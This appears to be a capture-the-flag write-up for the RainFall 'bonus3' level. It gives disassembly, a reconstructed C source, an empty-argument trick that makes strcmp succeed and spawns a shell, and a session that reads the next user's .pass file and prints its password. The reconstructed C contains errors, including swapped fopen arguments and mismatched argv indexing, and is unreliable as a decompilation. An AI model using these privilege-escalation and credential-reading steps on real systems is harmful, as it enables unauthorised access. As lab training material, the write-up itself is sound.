 804859c:       89 44 24 0c             mov    DWORD PTR [esp+0xc],eax
 80485a0:       c7 44 24 08 41 00 00    mov    DWORD PTR [esp+0x8],0x41
 80485a7:       00
 80485a8:       c7 44 24 04 01 00 00    mov    DWORD PTR [esp+0x4],0x1
 80485af:       00
 80485b0:       89 14 24                mov    DWORD PTR [esp],edx
 80485b3:       e8 18 fe ff ff          call   80483d0 <fread@plt>
 80485b8:       8b 84 24 9c 00 00 00    mov    eax,DWORD PTR [esp+0x9c]
 80485bf:       89 04 24                mov    DWORD PTR [esp],eax
 80485c2:       e8 f9 fd ff ff          call   80483c0 <fclose@plt>
 80485c7:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 80485ca:       83 c0 04                add    eax,0x4
 80485cd:       8b 00                   mov    eax,DWORD PTR [eax]
 80485cf:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 80485d3:       8d 44 24 18             lea    eax,[esp+0x18]
 80485d7:       89 04 24                mov    DWORD PTR [esp],eax
 80485da:       e8 d1 fd ff ff          call   80483b0 <strcmp@plt>
 80485df:       85 c0                   test   eax,eax
 80485e1:       75 1e                   jne    8048601 <main+0x10d>
 80485e3:       c7 44 24 08 00 00 00    mov    DWORD PTR [esp+0x8],0x0
 80485ea:       00
 80485eb:       c7 44 24 04 07 87 04    mov    DWORD PTR [esp+0x4],0x8048707
 80485f2:       08
 80485f3:       c7 04 24 0a 87 04 08    mov    DWORD PTR [esp],0x804870a
 80485fa:       e8 21 fe ff ff          call   8048420 <execl@plt>
 80485ff:       eb 0f                   jmp    8048610 <main+0x11c>
 8048601:       8d 44 24 18             lea    eax,[esp+0x18]
 8048605:       83 c0 42                add    eax,0x42
 8048608:       89 04 24                mov    DWORD PTR [esp],eax
 804860b:       e8 d0 fd ff ff          call   80483e0 <puts@plt>
 8048610:       b8 00 00 00 00          mov    eax,0x0
 8048615:       8d 65 f8                lea    esp,[ebp-0x8]
 8048618:       5b                      pop    ebx
 8048619:       5f                      pop    edi
 804861a:       5d                      pop    ebp
 804861b:       c3                      ret
 804861c:       90                      nop
 804861d:       90                      nop
 804861e:       90                      nop
 804861f:       90                      nop
 ```
The source code deduced from the objdump is like so :
```clike=

int main()
{
    FILE *passfile;
    char buf[132]; // 156 - 24
    int idx;
    
    // 8048513
    passfile = fopen("r", "/home/user/end/.pass");
    
    // 8048531
    memset(buf, 0, 33);
    
    if (!passfile || argc != 2)
        return -1;
    
    // 804856f
    fread(buf, 1, 66, passfile);
    
    // 8048584
    idx = atoi(argv[1]);
    
    // 8048589
    buf[idx] = 0;
    
    // 80485b3
    fread(buf + 66, 65, passfile);
    
    // 80485c2
    fclose(passfile);
    
    // 80485da
    if (strcmp(argv[2], buf) == 0)
        execl("/bin/sh", "sh");
    else
        puts(buf + 66);
    return 0;
}

```

Our goal here is to trip the case `strcmp(argv[2], buf) == 0`. We are unable to manipulate the contents inside buf as it reads from the flag. To trip this, the naive approach is to guess the contents of the flag and the length so we can construct the actual thing and put place it in argv[2] so they are equal.

Notice that we are able to put a nullbyte at any index in the flag read to guess anything behind it. In that case, if we put the null byte at the first index, then the correct value will always be an empty string.

The password is `3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c`
```
bonus3@RainFall:~$ ./bonus3 ""
$ pwd
/home/user/bonus3
$ whoami
end
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
$

```
